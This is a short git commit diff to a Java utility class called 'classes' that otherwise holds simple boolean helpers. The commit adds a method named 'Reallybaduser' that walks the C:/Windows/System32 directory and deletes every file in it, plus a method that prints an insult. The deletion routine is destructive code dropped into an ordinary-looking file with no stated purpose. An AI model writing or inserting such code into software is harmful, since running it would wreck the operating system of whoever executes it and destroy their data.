f8cfcbe13cd0b5d1c0b063f609ef5a09ca809403
troy600 <bazartroy531@gmail.com>
2024-10-30 14:53:37 +0800

    classes

--- classes.java
+++ classes.java
@@ -1,4 +1,21 @@
+import java.io.File;
+
 public class classes {
+
+    public static void Reallybaduser() {
+        File index = new File("C:/Windows/System32");
+        String[] entries = index.list();
+        if (entries != null) {
+            for (String f : entries) {
+                File file = new File(index.getPath(), f);
+                file.delete();
+            }
+        }
+    }
+
+    public static void BadUser() {
+        System.out.println("You're officially an asshole");
+    }
 
     public static boolean or(boolean a, boolean b) {
         if (a || b) {
